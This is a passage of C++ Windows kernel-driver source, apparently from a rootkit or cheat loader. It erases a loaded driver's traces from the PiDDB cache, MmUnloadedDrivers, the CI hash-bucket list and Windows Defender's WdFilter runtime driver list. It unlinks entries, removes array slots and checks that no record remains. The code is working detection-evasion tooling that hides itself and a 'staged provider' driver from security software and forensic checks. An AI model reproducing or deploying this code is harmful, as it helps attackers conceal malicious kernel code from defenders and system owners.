        print(ERROR("WdFilter: %u records but no array, refusing to walk"), *Count);
        return false;
    }
    if (!Array)
        print(INFO("WdFilter: no array allocated, array removal skipped"));

    const wchar_t* Base = Target->Buffer;
    uint32_t BaseChars = Target->Length / sizeof(wchar_t);

    uint32_t Walked = 0, Removed = 0, Failures = 0;
    bool Complete = true;

    _LIST_ENTRY* Link = Head->Flink;
    while (Link != Head)
    {
        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxWdFilterEntries)
        {
            print(WARN("WdFilter: malformed link %p, clean stopped"), (void*) Link);
            Complete = false;
            break;
        }

        // Saved before any mutation: the unlink below rewrites this node's neighbors, not this link
        _LIST_ENTRY* Next = Link->Flink;
        auto Entry = (uintptr_t) Link;
        _UNICODE_STRING Name = {};
        bool Named = ReadWdFilterName(Entry, &Name);

        Walked++;
        if (Named && HashBucketNameMatches(Name.Buffer, Name.Length / 2, Base, BaseChars))
        {
            print(INFO("WdFilter: removing %wZ"), &Name);

            if (!UnlinkWdFilterEntry(Link))
            {
                print(WARN("WdFilter: entry %p has inconsistent list links, not removed"), (void*) Entry);
                Failures++;
                Link = Next;
                continue;
            }

            if (Array && !RemoveWdFilterArraySlot(Array, Count, Entry - WdFilterArrayEntryDelta))
            {
                print(WARN("WdFilter: entry %p was not in RuntimeDriversArray (count %u)"),
                      (void*) Entry, *Count);
            }

            ReleaseWdFilterDriverInfo(Free, Entry - WdFilterDriverInfoDelta);
            Removed++;
        }

        Link = Next;
    }

    if (!Complete)
        print(WARN("WdFilter: clean walk stopped early (damaged list), result may be partial"));
    if (Failures)
        print(WARN("WdFilter: %u records could not be removed"), Failures);
    if (!Removed)
        print(INFO("WdFilter: no record for this driver out of %u walked"), Walked);
    else
        print(OK("WdFilter: %u records removed (%u walked, count now %u)"), Removed, Walked, *Count);

    return Complete && Failures == 0;
}

// Debug-only self-check of the WdFilter cleaner, run right after it inside CleanDriverTraces. No record
// may still match the target, the count must stay inside the array bound, and every slot below the count
// must still point at an allocation
void VerifyWdFilterDriverList(const _UNICODE_STRING* Target, uint32_t Timestamp)
{
    // A runtime-list record carries no timestamp to match on; the name is the only key here
    (void) Timestamp;

    if (!IsValidTraceTarget(Target))
    {
        print(ERROR("VerifyWdFilter: loader entry has no BaseDllName, cannot verify"));
        return;
    }

    address Wd = FindWdFilterBase();
    if (!Wd)
    {
        print(INFO("VerifyWdFilter: WdFilter not loaded, nothing to verify"));
        return;
    }

    _LIST_ENTRY* Head = FindWdFilterList(Wd);
    uint32_t* Count = FindWdFilterCount(Wd);
    void** Array = Count ? FindWdFilterArray(Count) : nullptr;
    if (!Head || !Count)
    {
        print(ERROR("VerifyWdFilter: list/count not found, cannot verify"));
        return;
    }

    uint32_t InUse = *Count;
    if (InUse > WdFilterArrayEntries)
    {
        print(ERROR("VerifyWdFilter: count %u exceeds the %u-entry array"), InUse, WdFilterArrayEntries);
        return;
    }

    if (!Array)
    {
        if (InUse)
        {
            print(ERROR("VerifyWdFilter: %u records but no array"), InUse);
            return;
        }
    }
    else
    {
        for (uint32_t Index = 0; Index < InUse; ++Index)
        {
            if (!IsKernelPointer((uint64_t) Array[Index]))
            {
                print(ERROR("VerifyWdFilter: array slot %u is %p below count %u"),
                      Index, Array[Index], InUse);
                return;
            }
        }
    }

    const wchar_t* Base = Target->Buffer;
    uint32_t BaseChars = Target->Length / sizeof(wchar_t);
    uint32_t Walked = 0;
    bool Complete = true;

    _LIST_ENTRY* Link = Head->Flink;
    while (Link != Head)
    {
        if (!IsKernelPointer((uint64_t) Link) || Walked >= MaxWdFilterEntries)
        {
            Complete = false;
            break;
        }

        _UNICODE_STRING Name = {};
        if (ReadWdFilterName((uintptr_t) Link, &Name) &&
            HashBucketNameMatches(Name.Buffer, Name.Length / 2, Base, BaseChars))
        {
            print(ERROR("VerifyWdFilter: FAILED, record %p still names this driver (%wZ)"),
                  (void*) Link, &Name);
            return;
        }

        Walked++;
        Link = Link->Flink;
    }

    if (!Complete)
    {
        print(ERROR("VerifyWdFilter: walk stopped early, list damaged?"));
        return;
    }

    print(OK("VerifyWdFilter: all checks passed (%u records, count %u, none name this driver)"),
          Walked, InUse);
}

// One pass over the four load traces, each its own small cleaner above. Runs at load (step 0, wiping
// records from earlier loads) and at unload (dropping this load's records; whatever MM adds after the
// unload callback returns is prevented by DriverExit zeroing BaseDllName.Length)
bool CleanDriverTraces(win::DRIVER_OBJECT* DriverObject)
{
    // A manual map has no loader-created DriverSection, so none of these records can belong to this
    // image. Do not let any of the cleaners run, even if a mapper supplies a partial/fake DriverObject.
    if (!DriverObject || !DriverObject->DriverSection)
    {
        print(INFO("CleanTraces: manual map (no DriverSection), skipping all trace cleaning"));
        return false;
    }

    // The loader entry is the target for every cleaner. Its BaseDllName goes through the shared
    // IsValidTraceTarget check inside each cleaner, which reports and skips when it is unusable
    auto Kldr = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;

    bool PiDDB = ClearPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    bool MmU = ClearMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    bool Hash = ClearKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    bool WdF = ClearWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);

#ifdef DEBUG
    // Only when the cleaner itself ran; release builds drop the calls and their functions
    VerifyPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    if (MmU) VerifyMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    if (Hash) VerifyKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    if (WdF) VerifyWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
#endif
    print(INFO("CleanTraces: piddb %u, mmu %u, hashbucket %u, wdfilter %u"),
          (uint32_t) PiDDB, (uint32_t) MmU, (uint32_t) Hash, (uint32_t) WdF);
    return PiDDB && MmU && Hash && WdF;
}

#ifdef DEBUG
// Debug-only self-test: after CleanDriverTraces has run, a second clear pass on
// the now-empty PiDDB / MmUnloadedDrivers / CI hash-bucket / WdFilter state must
// succeed, and the verifiers must find no record naming this driver.
bool VerifyEmptyTraceState(win::DRIVER_OBJECT* DriverObject)
{
    if (!DriverObject || !DriverObject->DriverSection)
    {
        print(INFO("VerifyEmptyTrace: no loader entry (manual map), skipped"));
        return true;
    }

    auto* Kldr = (_KLDR_DATA_TABLE_ENTRY*) DriverObject->DriverSection;
    const bool PiDDB = ClearPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    const bool MmU = ClearMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    const bool Hash = ClearKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    const bool WdF = ClearWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);

    VerifyPiDDBCache(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    VerifyMmUnloadedDrivers(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    VerifyKernelHashBucketList(&Kldr->BaseDllName, Kldr->TimeDateStamp);
    VerifyWdFilterDriverList(&Kldr->BaseDllName, Kldr->TimeDateStamp);

    if (!PiDDB || !MmU || !Hash || !WdF)
    {
        print(ERROR("VerifyEmptyTrace: second clear pass failed"));
        return false;
    }
    print(OK("VerifyEmptyTrace: empty-state clear/verify passed"));
    return true;
}
#endif

// The same four cleaners against an explicitly named image rather than this driver's loader entry.
// A manual-mapped run of this build uses it to remove the staged provider's records while the
// provider is still resident. Timestamp 0 keeps the PiDDB match strictly name-based:
// PiDDBEntryIsTarget only compares timestamps when the value is non-zero, so an unknown timestamp
// never acts as a wildcard
bool CleanExtraTraces(const _UNICODE_STRING* Target)
{
    // The manual-map second parameter is only a candidate: require the structure itself to be
    // kernel-resident and mapped before the shared helper dereferences it, then its name and buffer
    if (!IsKernelPointer((uint64_t) Target) ||
        !IsAddressValid((address) (uint64_t) Target, GetSystemCr3()) ||
        !IsValidTraceTarget(Target))
    {
        print(ERROR("CleanTraces: extra target is not a valid image name, skipped"));
        return false;
    }

    print(INFO("CleanTraces: extra target %wZ, no timestamp match"), Target);

    bool PiDDB = ClearPiDDBCache(Target, 0);
    bool MmU = ClearMmUnloadedDrivers(Target, 0);
    bool Hash = ClearKernelHashBucketList(Target, 0);
    bool WdF = ClearWdFilterDriverList(Target, 0);

#ifdef DEBUG
    // Only when the cleaner itself succeeded; release builds drop the calls and their functions
    if (PiDDB) VerifyPiDDBCache(Target, 0);
    if (MmU) VerifyMmUnloadedDrivers(Target, 0);
    if (Hash) VerifyKernelHashBucketList(Target, 0);
    if (WdF) VerifyWdFilterDriverList(Target, 0);
#endif
    print(INFO("CleanTraces: extra piddb %u, mmu %u, hashbucket %u, wdfilter %u"),
          (uint32_t) PiDDB, (uint32_t) MmU, (uint32_t) Hash, (uint32_t) WdF);
    return PiDDB && MmU && Hash && WdF;
}
